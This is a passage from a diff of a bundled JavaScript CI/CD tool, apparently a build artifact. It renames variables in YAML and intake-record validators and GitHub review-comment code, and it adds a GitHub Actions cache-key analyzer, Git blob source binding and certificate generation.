-  const bytes = Buffer.byteLength(text6, "utf8");
+function parseStrictYaml(text7, maxBytes, label) {
+  const bytes = Buffer.byteLength(text7, "utf8");
   if (bytes > maxBytes) return { problems: [`${label} is ${bytes} bytes; the limit is ${maxBytes} bytes.`] };
-  if (/^%/m.test(text6)) return { problems: [`${label} must not contain YAML directives (lines starting with %).`] };
+  if (/^%/m.test(text7)) return { problems: [`${label} must not contain YAML directives (lines starting with %).`] };
   let documents;
   try {
-    documents = (0, import_yaml50.parseAllDocuments)(text6, { uniqueKeys: true, merge: false, version: "1.2", prettyErrors: true });
+    documents = (0, import_yaml50.parseAllDocuments)(text7, { uniqueKeys: true, merge: false, version: "1.2", prettyErrors: true });
   } catch (error2) {
     return { problems: [`${label} is not valid YAML (${describeValue(error2 instanceof Error ? error2.message : String(error2))}).`] };
   }
@@ -40810,8 +48109,8 @@ function validateProject(raw, directory) {
     problems: []
   };
 }
-function parseProjectText(text6, directory) {
-  const parsed = parseStrictYaml(text6, PROJECT_MAX_BYTES, PROJECT_FILE);
+function parseProjectText(text7, directory) {
+  const parsed = parseStrictYaml(text7, PROJECT_MAX_BYTES, PROJECT_FILE);
   if (!parsed.value) return { problems: parsed.problems };
   return validateProject(parsed.value, directory);
 }
@@ -40838,8 +48137,8 @@ async function readCappedFile(client, repo, path, ref, maxBytes) {
   if (bytes.length > maxBytes) return { kind: "rejected", reason: `${path} is larger than ${maxBytes} bytes.` };
   return { kind: "file", text: bytes.toString("utf8") };
 }
-function parseConsentText(text6) {
-  const parsed = parseStrictYaml(text6, CONSENT_MAX_BYTES, CONSENT_PATH);
+function parseConsentText(text7) {
+  const parsed = parseStrictYaml(text7, CONSENT_MAX_BYTES, CONSENT_PATH);
   if (!parsed.value) return { problems: parsed.problems };
   const raw = parsed.value;
   const problems = [];
@@ -41021,14 +48320,14 @@ async function upsertReviewComment(client, repo, issue, name, body, bot = REVIEW
   const marker2 = reviewMarker(name);
   const comments = await paginate(client, "GET /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: issue }, 3);
   const existing = comments.find((comment) => comment.user?.login === bot && comment.user.type === "Bot" && (comment.body ?? "").split("\n", 1)[0] === marker2);
-  const text6 = body.startsWith(`${marker2}
+  const text7 = body.startsWith(`${marker2}
 `) ? body : `${marker2}
 ${body}`;
   if (existing) {
-    await client.request("PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}", { ...repo, comment_id: existing.id, body: text6 });
+    await client.request("PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}", { ...repo, comment_id: existing.id, body: text7 });
     return { action: "updated", id: existing.id };
   }
-  const response = await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: issue, body: text6 });
+  const response = await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: issue, body: text7 });
   const id = response.data?.id;
   return typeof id === "number" ? { action: "created", id } : { action: "created" };
 }
@@ -41146,12 +48445,12 @@ function classifyPullFiles(files, changedFiles) {
   if (file.status === "removed") return { kind: "opt-out", name, path: file.filename };
   return { kind: "submission", name, path: file.filename, status: file.status === "added" ? "added" : "modified" };
 }
-function parseIntakeArtifact(text6, expectedSha) {
-  if (Buffer.byteLength(text6, "utf8") > INTAKE_ARTIFACT_MAX_BYTES) return { problems: [`The intake record is larger than ${INTAKE_ARTIFACT_MAX_BYTES} bytes.`] };
+function parseIntakeArtifact(text7, expectedSha) {
+  if (Buffer.byteLength(text7, "utf8") > INTAKE_ARTIFACT_MAX_BYTES) return { problems: [`The intake record is larger than ${INTAKE_ARTIFACT_MAX_BYTES} bytes.`] };
   if (!SHA_PATTERN2.test(expectedSha)) return { problems: ["The expected head SHA must be 40 lowercase hex characters."] };
   let value2;
   try {
-    value2 = JSON.parse(text6);
+    value2 = JSON.parse(text7);
   } catch {
     return { problems: ["The intake record is not valid JSON."] };
   }
@@ -41166,7 +48465,7 @@ function parseIntakeArtifact(text6, expectedSha) {
   if (typeof headSha !== "string" || !SHA_PATTERN2.test(headSha)) problems.push("head_sha must be 40 lowercase hex characters.");
   if (problems.length > 0) return { problems };
   const artifact = { pr_number: prNumber, head_sha: headSha };
-  if (JSON.stringify(artifact) !== text6.trim()) return { problems: ["The intake record is not in canonical form."] };
+  if (JSON.stringify(artifact) !== text7.trim()) return { problems: ["The intake record is not in canonical form."] };
   if (artifact.head_sha !== expectedSha) return { problems: ["The intake record names a different commit than the workflow run."] };
   return { artifact, problems: [] };
 }
@@ -41315,7 +48614,7 @@ var MAX_OPEN_PULL_PAGES = 10;
 var STATUS_DESCRIPTION_MAX = 140;
 async function openPullsAt(client, repo, sha) {
   const pulls = await paginate(client, "GET /repos/{owner}/{repo}/pulls", { ...repo, state: "open" }, MAX_OPEN_PULL_PAGES);
-  return pulls.filter((pull) => pull.head?.sha === sha).map((pull) => pull.number).filter((number2) => typeof number2 === "number" && Number.isSafeInteger(number2) && number2 > 0);
+  return pulls.filter((pull) => pull.head?.sha === sha).map((pull) => pull.number).filter((number3) => typeof number3 === "number" && Number.isSafeInteger(number3) && number3 > 0);
 }
 async function unrecordedIntake(client, repo, pr, headSha, record5) {
   const snapshot = await snapshotPull(client, repo, pr, headSha);
@@ -41333,12 +48632,12 @@ async function runTrustedIntake(client, repo, options) {
   if (!SHA_PATTERN2.test(options.headSha)) throw new Error("The head SHA must be 40 lowercase hex characters.");
   const candidates2 = new Set(await openPullsAt(client, repo, options.headSha));
   if (options.record === "present" && options.pr !== void 0) candidates2.add(options.pr);
-  const entries2 = [];
+  const entries3 = [];
   for (const pr of [...candidates2].sort((a, b) => a - b)) {
     const result = options.record === "present" ? await runIntake(client, repo, { pr, headSha: options.headSha, registry: options.registry }) : await unrecordedIntake(client, repo, pr, options.headSha, options.record);
-    entries2.push({ pr, result });
+    entries3.push({ pr, result });
   }
-  return entries2;
+  return entries3;
 }
 function failureReason(result) {
   switch (result.report?.status) {
@@ -41354,14 +48653,14 @@ function failureReason(result) {
       return "intake failed.";
   }
 }
-function intakeCommitStatus(entries2) {
+function intakeCommitStatus(entries3) {
   const status = (state, description) => ({ state, description: description.slice(0, STATUS_DESCRIPTION_MAX) });
-  if (entries2.length === 0) return status("failure", "No open pull request points at this commit.");
-  const failed = entries2.filter((entry2) => entry2.result.exitCode !== 0);
+  if (entries3.length === 0) return status("failure", "No open pull request points at this commit.");
+  const failed = entries3.filter((entry2) => entry2.result.exitCode !== 0);
   const [first] = failed;
   if (failed.length > 1) return status("failure", `${failed.length} pull requests at this commit failed intake.`);
   if (first) return status("failure", `#${first.pr}: ${failureReason(first.result)}`);
-  if (entries2.every((entry2) => entry2.result.kind === "none")) return status("success", "No project changes to review.");
+  if (entries3.every((entry2) => entry2.result.kind === "none")) return status("success", "No project changes to review.");
   return status("success", "Intake checks passed.");
 }
 
@@ -41416,7 +48715,7 @@ async function readProjectFile(io, path) {
   return { text: await readFile7(target, "utf8"), directory };
 }
 async function validateCommand(args, io) {
-  const { values: values2, positionals: positionals3 } = parseArgs9({ args, strict: true, allowPositionals: true, options: { help: { type: "boolean", short: "h", default: false } } });
+  const { values: values2, positionals: positionals3 } = parseArgs10({ args, strict: true, allowPositionals: true, options: { help: { type: "boolean", short: "h", default: false } } });
   if (values2.help) {
     io.stdout(REVIEW_HELP);
     return 0;
@@ -41424,8 +48723,8 @@ async function validateCommand(args, io) {
   if (positionals3.length === 0) throw new UsageError("review validate needs at least one project.yaml file.");
   let failed = false;
   for (const path of positionals3) {
-    const { text: text6, directory } = await readProjectFile(io, path);
-    const parsed = parseProjectText(text6, directory);
+    const { text: text7, directory } = await readProjectFile(io, path);
+    const parsed = parseProjectText(text7, directory);
     if (parsed.project) {
       io.stdout(`${path}: ok`);
     } else {
@@ -41437,7 +48736,7 @@ async function validateCommand(args, io) {
   return failed ? 1 : 0;
 }
 async function runCommand(args, io) {
-  const { values: values2, positionals: positionals3 } = parseArgs9({
+  const { values: values2, positionals: positionals3 } = parseArgs10({
     args,
     strict: true,
     allowPositionals: true,
@@ -41458,8 +48757,8 @@ async function runCommand(args, io) {
   const [path, ...extra] = positionals3;
   if (!path || extra.length > 0) throw new UsageError("review run needs exactly one project.yaml file.");
   const registry = registryFrom(values2.registry, io);
-  const { text: text6, directory } = await readProjectFile(io, path);
-  const parsed = parseProjectText(text6, directory);
+  const { text: text7, directory } = await readProjectFile(io, path);
+  const parsed = parseProjectText(text7, directory);
   let report;
   if (!parsed.project) {
     report = buildReport(
@@ -41474,7 +48773,7 @@ async function runCommand(args, io) {
   return reportExitCode(report);
 }
 async function intakeCommand(args, io) {
-  const { values: values2 } = parseArgs9({
+  const { values: values2 } = parseArgs10({
     args,
     strict: true,
     options: {
@@ -41509,7 +48808,7 @@ async function intakeCommand(args, io) {
   return result.exitCode;
 }
 async function intakeArtifactCommand(args, io) {
-  const { values: values2, positionals: positionals3 } = parseArgs9({
+  const { values: values2, positionals: positionals3 } = parseArgs10({
     args,
     strict: true,
     allowPositionals: true,
@@ -41552,7 +48851,7 @@ function runUrl2(env) {
   return `${server}/${repository}/actions/runs/${runId}`;
 }
 async function intakeStatusCommand(args, io) {
-  const { values: values2 } = parseArgs9({
+  const { values: values2 } = parseArgs10({
     args,
     strict: true,
     options: {
@@ -41584,21 +48883,21 @@ async function intakeStatusCommand(args, io) {
   const repo = repoFrom(values2.repo, io);
   const registry = registryFrom(values2.registry ?? `${repo.owner}/${repo.repo}`, io);
   const client = githubClient(io);
-  const entries2 = await runTrustedIntake(client, repo, { headSha, record: record5, registry, ...pr !== void 0 ? { pr } : {} });
-  const decision = intakeCommitStatus(entries2);
+  const entries3 = await runTrustedIntake(client, repo, { headSha, record: record5, registry, ...pr !== void 0 ? { pr } : {} });
+  const decision = intakeCommitStatus(entries3);
   const sections = [`## Trusted review intake for ${headSha.slice(0, 12)}
 
 **${decision.state}**: ${decision.description}
 `];
-  for (const { pr: number2, result } of entries2) sections.push(`### Pull request #${number2}
+  for (const { pr: number3, result } of entries3) sections.push(`### Pull request #${number3}
 
 ${result.markdown}`);
   await writeText(io, values2.output, sections.join("\n"));
   if (values2.comment) {
-    for (const { pr: number2, result } of entries2) {
+    for (const { pr: number3, result } of entries3) {
       if (!result.report) continue;
-      const { action } = await upsertReviewComment(client, repo, number2, result.name, result.markdown);
-      io.stderr(`review comment ${action} on #${number2}`);
+      const { action } = await upsertReviewComment(client, repo, number3, result.name, result.markdown);
+      io.stderr(`review comment ${action} on #${number3}`);
     }
   }
   if (values2.status) {
@@ -41616,7 +48915,7 @@ ${result.markdown}`);
   return decision.state === "success" ? 0 : 1;
 }
 async function scheduledCommand(args, io) {
-  const { values: values2 } = parseArgs9({
+  const { values: values2 } = parseArgs10({
     args,
     strict: true,
     options: {
@@ -41636,13 +48935,13 @@ async function scheduledCommand(args, io) {
   const jsonDir = values2["json-dir"];
   if (jsonDir !== void 0 && jsonDir.trim() === "") throw new UsageError("--json-dir needs a directory.");
   const jsonRoot = jsonDir === void 0 ? void 0 : resolvePath(io, jsonDir);
-  let entries2;
+  let entries3;
   try {
-    entries2 = await readdir4(root, { withFileTypes: true });
+    entries3 = await readdir4(root, { withFileTypes: true });
   } catch (error2) {
     throw new UsageError(`Cannot read ${values2.dir}: ${error2.message}`);
   }
-  const names = entries2.filter((entry2) => entry2.isDirectory()).map((entry2) => entry2.name).sort();
+  const names = entries3.filter((entry2) => entry2.isDirectory()).map((entry2) => entry2.name).sort();
   const client = githubClient(io);
   const rows = [];
   const details = [];
@@ -41654,8 +48953,8 @@ async function scheduledCommand(args, io) {
     const file = join8(root, directory, PROJECT_FILE);
     const exists = await lstat2(file).then((info) => info.isFile(), () => false);
     if (!exists) continue;
-    const { text: text7 } = await readProjectFile(io, file);
-    const parsed = parseProjectText(text7, directory);
+    const { text: text8 } = await readProjectFile(io, file);
+    const parsed = parseProjectText(text8, directory);
     if (!parsed.project) {
       report = buildReport({ project: NAME_PATTERN.test(directory) ? directory : "intake", status: "invalid", problems: parsed.problems, notes: [], diagnostics: [], filesAnalyzed: 0, inventoryComplete: true }, { public: true });
     } else {
@@ -41675,12 +48974,12 @@ _Report truncated._` : body, "</details>", "");
   }
   const lines = ["### Scheduled project reviews", "", `${rows.length === 0 ? "No" : rows.length} registered project${rows.length === 1 ? "" : "s"} reviewed.`, ""];
   if (rows.length > 0) lines.push("| Project | Status | Files | Error | Warn | Info | Withheld |", "| --- | --- | --- | --- | --- | --- | --- |", ...rows, "", ...details);
-  let text6 = lines.join("\n");
-  if (text6.length > SCHEDULED_MAX_BYTES) text6 = `${text6.slice(0, SCHEDULED_MAX_BYTES)}
+  let text7 = lines.join("\n");
+  if (text7.length > SCHEDULED_MAX_BYTES) text7 = `${text7.slice(0, SCHEDULED_MAX_BYTES)}
 
 _Summary truncated._
 `;
-  await writeText(io, values2.output, text6);
+  await writeText(io, values2.output, text7);
   return failed ? 1 : 0;
 }
 var COMMANDS3 = {
@@ -41702,6 +49001,533 @@ async function reviewCommand(args, io) {
   return handler(rest, io);
 }
 
+// src/cli/formal.ts
+import { readFile as readFile8 } from "node:fs/promises";
+import { parseArgs as parseArgs11 } from "node:util";
+
+// src/formal/cache-key.ts
+var import_yaml51 = __toESM(require_dist(), 1);
+var CONTEXTS = ["sha", "run_id", "run_number", "run_attempt", "ref", "event_name"];
+function extractCacheKey(source, job, step) {
+  const document = (0, import_yaml51.parseDocument)(source.content, { uniqueKeys: true, keepSourceTokens: true });
+  if (document.errors.length || document.warnings.length) throw new Error("Workflow YAML must parse without errors or warnings.");
+  (0, import_yaml51.visit)(document, (_key, node) => {
+    if ((0, import_yaml51.isAlias)(node)) throw new Error("YAML aliases are outside the extraction contract.");
+    if ((0, import_yaml51.isMap)(node) && node.items.some((pair) => (0, import_yaml51.isScalar)(pair.key) && pair.key.value === "<<")) throw new Error("YAML merge keys are outside the extraction contract.");
+  });
+  const jobs = document.get("jobs", true);
+  if (!(0, import_yaml51.isMap)(jobs)) throw new Error("Workflow must have a literal jobs mapping.");
+  const selected = jobs.get(job, true);
+  if (!(0, import_yaml51.isMap)(selected)) throw new Error(`Unknown workflow job: ${job}`);
+  const steps2 = selected.get("steps", true);
+  if (!Number.isSafeInteger(step) || step < 0 || !(0, import_yaml51.isSeq)(steps2)) throw new Error("Step must be a nonnegative index in a literal steps array.");
+  const action = steps2.items[step];
+  if (!(0, import_yaml51.isMap)(action)) throw new Error("Selected step is not a mapping.");
+  const uses = action.get("uses", true);
+  if (!(0, import_yaml51.isScalar)(uses) || typeof uses.value !== "string" || !/^actions\/cache(?:\/(?:restore|save))?@[a-zA-Z0-9._/-]+$/.test(uses.value)) {
+    throw new Error("Selected step must use a literal actions/cache, actions/cache/restore or actions/cache/save reference.");
+  }
+  const inputs = action.get("with", true);
+  if (!(0, import_yaml51.isMap)(inputs)) throw new Error("Cache inputs must be a literal mapping.");
+  const inputNames = inputs.items.map((pair) => {
+    if (!(0, import_yaml51.isScalar)(pair.key) || typeof pair.key.value !== "string") throw new Error("Cache input names must be literal strings.");
+    return pair.key.value.toLowerCase();
+  });
+  if (new Set(inputNames).size !== inputNames.length) throw new Error("Case-colliding cache input names are unsupported.");
+  if (inputNames.includes("restore-keys") || inputNames.includes("enablecrossosarchive")) throw new Error("restore-keys and cross-OS archive inputs are outside this model.");
+  const key2 = inputs.get("key", true);
+  if (!(0, import_yaml51.isScalar)(key2) || typeof key2.value !== "string" || !key2.range) throw new Error("Cache key must be a literal YAML string containing only supported expressions.");
+  scalarString(key2.value);
+  const [start2, end] = key2.range;
+  return {
+    job,
+    step,
+    uses: uses.value,
+    key: key2.value,
+    utf8Start: Buffer.byteLength(source.content.slice(0, start2), "utf8"),
+    utf8End: Buffer.byteLength(source.content.slice(0, end), "utf8"),
+    rawKeyBase64: Buffer.from(source.content.slice(start2, end), "utf8").toString("base64")
+  };
+}
+function expression(input2) {
+  const text7 = scalarString(input2).trim();
+  if (text7 === "runner.os") return { kind: "os" };
+  const name = CONTEXTS.find((context4) => text7 === `github.${context4}`);
+  if (name) return { kind: "context", name };
+  const match2 = /^hashFiles\s*\(([\s\S]*)\)$/.exec(text7);
+  if (!match2) throw new Error(`Unsupported expression: ${text7}`);
+  const args = match2[1] ?? "";
+  const patterns = [];
+  let at = 0;
+  const whitespace = () => {
+    while (at < args.length && /\s/u.test(args[at] ?? "")) at += 1;
+  };
+  whitespace();
+  while (at < args.length) {
+    if (args[at++] !== "'") throw new Error("hashFiles arguments must be single-quoted literal strings.");
+    let pattern = "";
+    let closed = false;
+    while (at < args.length) {
+      const ch = args[at++];
+      if (ch === "'") {
+        if (args[at] === "'") {
+          pattern += "'";
+          at += 1;
+        } else {
+          closed = true;
+          break;
+        }
+      } else pattern += ch;
+    }
+    if (!closed) throw new Error("Unterminated hashFiles argument.");
+    if (pattern.length > 1024 || patterns.length >= 32) throw new Error("hashFiles argument limit exceeded.");
+    patterns.push(pattern);
+    whitespace();
+    if (at === args.length) break;
+    if (args[at++] !== ",") throw new Error("Unexpected hashFiles argument syntax.");
+    whitespace();
+    if (at === args.length) throw new Error("Trailing hashFiles comma.");
+  }
+  if (!patterns.length) throw new Error("hashFiles requires at least one literal pattern.");
+  return { kind: "hash", patterns };
+}
+function parseTemplate(key2) {
+  scalarString(key2);
+  if (key2.length > 8192) throw new Error("Key template exceeds 8192 UTF-16 code units.");
+  const parts2 = [];
+  let at = 0;
+  while (at < key2.length) {
+    const opening = key2.indexOf("${{", at);
+    if (opening < 0) {
+      parts2.push({ kind: "literal", value: key2.slice(at) });
+      break;
+    }
+    if (opening > at) parts2.push({ kind: "literal", value: key2.slice(at, opening) });
+    let end = opening + 3;
+    let quoted = false;
+    for (; end < key2.length; end += 1) {
+      if (key2[end] === "'") {
+        if (quoted && key2[end + 1] === "'") end += 1;
+        else quoted = !quoted;
+      } else if (!quoted && key2.startsWith("}}", end)) break;
+    }
+    if (end === key2.length || quoted) throw new Error("Unterminated cache-key expression.");
+    parts2.push(expression(key2.slice(opening + 3, end)));
+    at = end + 2;
+  }
+  if (parts2.length > 128) throw new Error("At most 128 key components.");
+  return parts2;
+}
+function nameOf(component) {
+  if (component.kind === "os") return "runner.os";
+  if (component.kind === "context") return `github.${component.name}`;
+  return `hashFiles(${component.patterns.map((pattern) => `'${pattern.replaceAll("'", "''")}'`).join(",")})`;
+}
+var contextEncode = (name) => {
+  switch (name) {
+    case "sha":
+      return CacheKey.CtxVar.create_Sha();
+    case "run_id":
+      return CacheKey.CtxVar.create_RunId();
+    case "run_number":
+      return CacheKey.CtxVar.create_RunNumber();
+    case "run_attempt":
+      return CacheKey.CtxVar.create_RunAttempt();
+    case "ref":
+      return CacheKey.CtxVar.create_Ref();
+    case "event_name":
+      return CacheKey.CtxVar.create_EventName();
+  }
+};
+function contextDecode(context4) {
+  if (context4.is_Sha) return "sha";
+  if (context4.is_RunId) return "run_id";
+  if (context4.is_RunNumber) return "run_number";
+  if (context4.is_RunAttempt) return "run_attempt";
+  if (context4.is_Ref) return "ref";
+  if (context4.is_EventName) return "event_name";
+  throw new Error("Unexpected generated context.");
+}
+function analyzeCacheKey(key2, declared) {
+  const parts2 = parseTemplate(key2);
+  if (declared && declared.length > 128) throw new Error("At most 128 declared dependencies.");
+  const inferred = parts2.filter((part2) => part2.kind !== "literal").filter((part2) => part2.kind !== "context" || part2.name === "ref" || part2.name === "event_name");
+  const rawDeps = declared === null ? inferred : declared.map(expression);
+  const deps = [...new Map(rawDeps.map((dep) => [nameOf(dep), dep])).values()].sort((a, b) => nameOf(a) < nameOf(b) ? -1 : nameOf(a) > nameOf(b) ? 1 : 0);
+  if (declared && deps.length !== declared.length) throw new Error("Duplicate declared dependency.");
+  const dynamics = [...new Map([...parts2.filter((part2) => part2.kind !== "literal"), ...deps].map((part2) => [nameOf(part2), part2])).values()].sort((a, b) => nameOf(a) < nameOf(b) ? -1 : nameOf(a) > nameOf(b) ? 1 : 0);
+  const hashes = dynamics.filter((part2) => part2.kind === "hash");
+  const hashId = (part2) => {
+    const id = hashes.findIndex((hash4) => nameOf(hash4) === nameOf(part2));
+    if (id < 0) throw new Error("Unknown hashFiles identity.");
+    return new BigNumber(id);
+  };
+  const encode3 = (part2) => {
+    switch (part2.kind) {
+      case "literal":
+        return CacheKey.Comp.create_Lit(_dafny.Seq.UnicodeFromString(part2.value));
+      case "os":
+        return CacheKey.Comp.create_RunnerOs();
+      case "hash":
+        return CacheKey.Comp.create_HashFiles(hashId(part2));
+      case "context":
+        return CacheKey.Comp.create_Ctx(contextEncode(part2.name));
+    }
+  };
+  const encodeDep = (dep) => {
+    switch (dep.kind) {
+      case "os":
+        return CacheKey.Dep.create_DOs();
+      case "hash":
+        return CacheKey.Dep.create_DFiles(hashId(dep));
+      case "context":
+        return CacheKey.Dep.create_DCtx(contextEncode(dep.name));
+    }
+  };
+  const decodeHash = (id) => {
+    const part2 = hashes[id.toNumber()];
+    if (!part2 || !id.isInteger() || id.isNegative()) throw new Error("Unexpected generated hashFiles identity.");
+    return part2;
+  };
+  const decode2 = (part2) => {
+    if (part2.is_Lit) return { kind: "literal", value: part2.dtor_s.toVerbatimString(false) };
+    if (part2.is_RunnerOs) return { kind: "os" };
+    if (part2.is_HashFiles) return decodeHash(part2.dtor_id);
+    if (part2.is_Ctx) return { kind: "context", name: contextDecode(part2.dtor_c) };
+    throw new Error("Unexpected generated component.");
+  };
+  const decodeDep = (dep) => {
+    if (dep.is_DOs) return { kind: "os" };
+    if (dep.is_DFiles) return decodeHash(dep.dtor_id);
+    if (dep.is_DCtx) return { kind: "context", name: contextDecode(dep.dtor_c) };
+    throw new Error("Unexpected generated dependency.");
+  };
+  const template = _dafny.Seq.of(...parts2.map(encode3));
+  const dependencies = _dafny.Seq.of(...deps.map(encodeDep));
+  const verdict = CacheKey.__default.Classify(template, dependencies);
+  if (verdict.is_Unsupported) throw new Error(`Key is outside the separated-template model at component ${verdict.dtor_at.toNumber()}.`);
+  const normalized = CacheKey.__default.Norm(template);
+  const recommended = CacheKey.__default.Recommend(template, dependencies);
+  const recommendedParts = Array.from(recommended, decode2);
+  const recommendedVerdict = CacheKey.__default.Classify(recommended, dependencies);
+  const normalizedParts = Array.from(normalized, decode2);
+  let proposedKey = recommendedParts.map((part2) => part2.kind === "literal" ? part2.value : `\${{ ${nameOf(part2)} }}`).join("");
+  try {
+    const reparsed = CacheKey.__default.Norm(_dafny.Seq.of(...parseTemplate(proposedKey).map(encode3)));
+    if (canonicalJson(Array.from(reparsed, decode2)) !== canonicalJson(recommendedParts)) proposedKey = null;
+  } catch {
+    proposedKey = null;
+  }
+  const base2 = CacheKey.__default.Base();
+  const snapshot = (run4) => dynamics.map((part2) => ({
+    component: nameOf(part2),
+    value: CacheKey.__default.Val(encode3(part2), run4).toVerbatimString(false)
+  }));
+  const witness = (dep, expectedKeyEqual) => {
+    const varied = CacheKey.__default.Vary(dep);
+    const keyEqual = CacheKey.__default.KeyEq(template, base2, varied);
+    const dependenciesEqual = CacheKey.__default.DepsEq(CacheKey.__default.DSet(dependencies), base2, varied);
+    if (!CacheKey.__default.WF(template, base2) || !CacheKey.__default.WF(template, varied) || keyEqual !== expectedKeyEqual || dependenciesEqual === expectedKeyEqual) throw new Error("Generated counterexample failed its runtime postcondition.");
+    return {
+      varied: nameOf(decodeDep(dep)),
+      left: snapshot(base2),
+      right: snapshot(varied),
+      leftKey: CacheKey.__default.Render(template, base2).toVerbatimString(false),
+      rightKey: CacheKey.__default.Render(template, varied).toVerbatimString(false),
+      keyEqual,
+      dependenciesEqual
+    };
+  };
+  return {
+    dependencyPolicy: declared === null ? "inferred-excluding-run-contexts" : "declared",
+    dependencies: deps.map(nameOf),
+    normalized: normalizedParts,
+    exactPartition: verdict.dtor_uncovered.length === 0 && verdict.dtor_undetermined.length === 0,
+    uncovered: Array.from(verdict.dtor_uncovered, (dep) => witness(dep, true)),
+    undetermined: Array.from(verdict.dtor_undetermined, (part2) => witness(CacheKey.__default.DepOf(part2), false)),
+    recommendation: {
+      components: recommendedParts,
+      key: proposedKey,
+      supported: !recommendedVerdict.is_Unsupported && proposedKey !== null,
+      exactPartition: !recommendedVerdict.is_Unsupported && recommendedVerdict.dtor_uncovered.length === 0 && recommendedVerdict.dtor_undetermined.length === 0,
+      coarsensOriginalPartition: true
+    }
+  };
+}
+var CACHE_ASSUMPTIONS = [
+  "D denotes only the explicitly declared (or labeled inferred) component values, not the actual dependencies of arbitrary pipeline code.",
+  "Abstract runs independently range over the stated domains: OS Linux/Windows/macOS; hashFiles empty or 64 lowercase hex; SHA 40 lowercase hex; run counters nonempty decimal strings; ref/event arbitrary Unicode scalars.",
+  "The model concerns primary-key string equality only, not Actions cache scope/version, prefix restore, save races, eviction, hits, speed, or hash collision resistance.",
+  "The YAML/expression extractor and JavaScript/Dafny compiler/runtime bridge are trusted code, tested but not formally proved equivalent to GitHub Actions.",
+  "A recommendation is a model transformation, not a workflow patch or evidence that removing a context dependency is safe for the workload."
+];
+
+// src/formal/source.ts
+import { execFile as execFile3 } from "node:child_process";
+import { createHash as createHash6 } from "node:crypto";
+import { promisify as promisify3 } from "node:util";
+var exec2 = promisify3(execFile3);
+var OID = /^(?:[a-f0-9]{40}|[a-f0-9]{64})$/;
+function location2(commit, path) {
+  if (!OID.test(commit)) throw new Error("Source commit must be a full lowercase Git object id, not a mutable ref.");
+  scalarString(path);
+  const controlCharacters = [...path].some((character) => character.charCodeAt(0) < 32 || character.charCodeAt(0) === 127);
+  if (!path || path.length > 4096 || /[:\\]/.test(path) || controlCharacters || path.split("/").some((part2) => !part2 || part2 === "." || part2 === "..")) {
+    throw new Error("Source path must be a repository-relative Git path without traversal.");
+  }
+}
+function blobId(content2, format3) {
+  return createHash6(format3).update(`blob ${content2.length}\0`).update(content2).digest("hex");
+}
+function validateSourceBlob(source) {
+  location2(source.commit, source.path);
+  scalarString(source.content);
+  if (!OID.test(source.blob)) throw new Error("Invalid recorded Git blob id.");
+  const bytes = Buffer.from(source.content, "utf8");
+  if (bytes.length > 2e6) throw new Error("Source blob exceeds 2 MB.");
+  if (blobId(bytes, source.blob.length === 40 ? "sha1" : "sha256") !== source.blob) throw new Error("Recorded source bytes do not match the Git blob id.");
+}
+function decodeSourceBlob(value2) {
+  const record5 = object(value2, "source");
+  exactKeys(record5, ["commit", "path", "blob", "content"], "source");
+  const result = {
+    commit: string(record5.commit, "source.commit"),
+    path: string(record5.path, "source.path"),
+    blob: string(record5.blob, "source.blob"),
+    content: string(record5.content, "source.content")
+  };
+  validateSourceBlob(result);
+  return result;
+}
+async function readCommittedBlob(repository, commit, path) {
+  location2(commit, path);
+  const git2 = async (...args) => (await exec2("git", ["--no-pager", "--no-replace-objects", "-C", repository, ...args], { encoding: "buffer", maxBuffer: 2000100, timeout: 15e3 })).stdout;
+  if ((await git2("cat-file", "-t", commit)).toString("utf8").trim() !== "commit") throw new Error("Source id is not a commit.");
+  const blob = (await git2("rev-parse", "--verify", `${commit}:${path}`)).toString("utf8").trim();
+  if (!OID.test(blob) || (await git2("cat-file", "-t", blob)).toString("utf8").trim() !== "blob") throw new Error("Source path does not identify a Git blob.");
+  const bytes = await git2("cat-file", "blob", blob);
+  const content2 = new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(bytes);
+  if (!Buffer.from(content2, "utf8").equals(bytes)) throw new Error("Source must round-trip as UTF-8 bytes.");
+  const source = { commit, path, blob, content: content2 };
+  validateSourceBlob(source);
+  return source;
+}
+async function bindSources(sources, repository) {
+  for (const source of sources) {
+    const actual = await readCommittedBlob(repository, source.commit, source.path);
+    if (actual.blob !== source.blob || actual.content !== source.content) throw new Error(`Stale or forged source binding: ${source.commit}:${source.path}`);
+  }
+}
+
+// src/formal/certificate.ts
+var CERTIFICATE_SCHEMA = "cicd-optimizer/certificate-v1";
+function seal(body) {
+  return { ...body, digest: certificateDigest(body) };
+}
+function createCiPlanCertificate(source, searchBudget = CI_MODEL_LIMITS.defaultSearchBudget) {
+  validateSourceBlob(source);
+  return seal({
+    schema: CERTIFICATE_SCHEMA,
+    kind: "ci-policy-plan",
+    proof: PROOF_BUILD,
+    source,
+    request: { searchBudget },
+    assumptions: CI_MODEL_ASSUMPTIONS,
+    result: planCiEnvironment(parseCiEnvironmentModel(source.content), { searchBudget })
+  });
+}
+function createCacheCertificate(source, job, step, dependencies) {
+  validateSourceBlob(source);
+  scalarString(job);
+  if (!job || job.length > 512) throw new Error("Invalid job selector.");
+  const extraction = extractCacheKey(source, job, step);
+  return seal({
+    schema: CERTIFICATE_SCHEMA,
+    kind: "cache-key",
+    proof: PROOF_BUILD,
+    source,
+    request: { job, step, dependencies },
+    assumptions: CACHE_ASSUMPTIONS,
+    extraction,
+    result: analyzeCacheKey(extraction.key, dependencies)
+  });
+}
+var SELECTION_ASSUMPTIONS = [
+  "The universe is exactly the manifest's unique ASCII-named arms, ordered by ASCII name. Missing measurements are pending; unlisted measurements are excluded.",
+  "The objective is a quantized weighted score, not elapsed time itself, a global search optimum, or proof that a recommendation addresses a real bottleneck.",
+  "Committed observations (including checks, changed paths and judge scores) are inputs, not authenticated evidence. Arm code can fabricate measurements; Git blob binding does not attest execution.",
+  "CI inputs require distinct successful first-attempt workflow_dispatch observations matching recorded heads, expected branches and workflow identity, with durations recomputed from timestamps. This offline certificate does not contact GitHub; consistent provenance is not authenticated execution or equivalent workload.",
+  "Metric extraction, medians, observed-tail Mann-Whitney filtering, dependency parsing, clock/expiry interpretation and decimal quantization are tested trusted preprocessing, not proved by the integer selector.",
+  "CI noise filtering is an unadjusted repeated-comparison heuristic, not a significance guarantee; regression gates apply to scored deltas after that filter.",
